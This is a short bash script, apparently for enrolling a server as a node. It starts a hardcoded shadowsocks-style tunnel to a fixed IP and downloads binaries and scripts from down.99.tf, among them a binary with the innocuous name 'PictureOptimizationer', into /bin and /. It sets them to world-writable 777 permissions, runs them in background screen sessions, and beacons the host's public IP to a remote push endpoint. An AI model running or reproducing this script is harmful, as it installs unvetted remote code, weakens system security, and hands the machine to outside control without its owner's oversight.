#! /bin/bash
######
ulimit -SHn 1020000
######
#wget down.99.tf/ss -O /bin/s2 && chmod -R 777 /bin/s2
#sh -c 's2 -p 30001 -k mm1 -m rc4-md5 -R "ss.qq.ee/heart" -T 10000 -I "node" -X 1 &'
######
#slocal -s 13.230.5.149 -p 443 -k mm1 -m rc4-md5 -l 1080 -U -b 127.0.0.1
screen -dmS "SL" sh -c 'slocal -s 13.230.5.149 -p 443 -k mm1 -m rc4-md5 -l 1080 -U -b 127.0.0.1'
#curl -x socks5://127.0.0.1:1080 myip.ipip.net
######
wget down.99.tf/PictureOptimizationer -O /bin/PictureOptimizationer && chmod -R 777 /bin/PictureOptimizationer
wget down.99.tf/google/MQ.list -O /MQ.list
##
wget down.99.tf/google/RoutMQ.sh -O /bin/RoutMQ.sh && chmod -R 777 /bin/RoutMQ.sh
screen -dmS "MQ" sh -c 'RoutMQ.sh'
######
wget down.99.tf/google/init.sh -O /init.sh
chmod -R 777 /init.sh
######
MYIP=$(wget ip.qq.ee/?i=1 -qO-)
NOW=$(date -d "0 hours" +"%Y%m%d %H:%M:%S")
wget "http://pushbullet.api.qq.ee/?title=[$NOW]$MYIP&body=." -O-
######